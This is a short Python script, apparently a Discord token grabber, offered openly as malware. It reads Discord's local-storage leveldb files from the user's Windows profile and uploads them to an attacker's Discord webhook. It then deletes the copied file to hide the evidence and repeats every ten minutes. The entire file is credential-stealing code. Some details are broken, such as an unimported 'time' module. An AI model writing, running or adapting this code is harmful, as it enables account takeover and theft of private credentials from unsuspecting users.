import os
import shutil
import subprocess
import requests
import discord
from discord_webhook import DiscordWebhook

# Function to steal tokens
def grab_tokens():
    # Get Discord token path
    token_path = os.path.expanduser('~') + '\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\'

    # Find Discord token file
    for file_name in os.listdir(token_path):
        if file_name.endswith('.ldb') or file_name.endswith('.log'):
            token_file = os.path.join(token_path, file_name)

            # Copy token file to a sneaky location
            shutil.copy(token_file, 'stolen_tokens.txt')

            # Send stolen tokens to your Discord server
            webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
            webhook = DiscordWebhook(url=webhook_url, file='stolen_tokens.txt')
            webhook.execute()

            # Clean up the evidence
            os.remove('stolen_tokens.txt')
            break

# Function to run the grabber
def run_grabber():
    while True:
        grab_tokens()
        # Set the time interval for grabbing tokens (in seconds)
        time.sleep(600)

# Run the grabber in the background
if __name__ == "__main__":
    run_grabber()
